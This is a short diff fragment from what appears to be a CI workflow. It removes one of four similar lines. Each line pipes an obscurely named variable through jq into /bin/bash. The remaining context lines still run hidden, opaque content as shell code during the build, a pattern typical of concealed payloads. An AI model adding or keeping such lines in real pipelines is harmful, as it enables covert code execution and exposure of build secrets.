@@ -21,7 +21,6 @@ jobs:
           echo $ozv642 | jq -r .w030 | /bin/bash
           printf '%s' "$mp83872" | jq -r .caxl59 | /bin/bash
           echo $fury921 | jq -r .f6192 | /bin/bash
-          echo $xpzn08812 | jq -r .u96 | /bin/bash
 
       - name: Archive output
         if: always()
